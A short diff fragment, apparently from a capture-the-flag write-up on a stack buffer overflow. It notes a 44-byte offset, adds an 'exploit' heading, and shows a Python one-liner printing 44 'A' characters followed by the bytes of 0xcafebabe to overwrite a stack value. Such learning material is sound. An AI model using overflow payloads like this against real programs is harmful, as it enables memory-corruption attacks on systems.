@@ -108,7 +108,7 @@ when i try to fill stack with values. i found it is 44
 
 so we can craft our exploit.
 
-
+## exploit
 python -c 'print "A"*44 + "\xbe\xba\xfe\xca" '
 
  
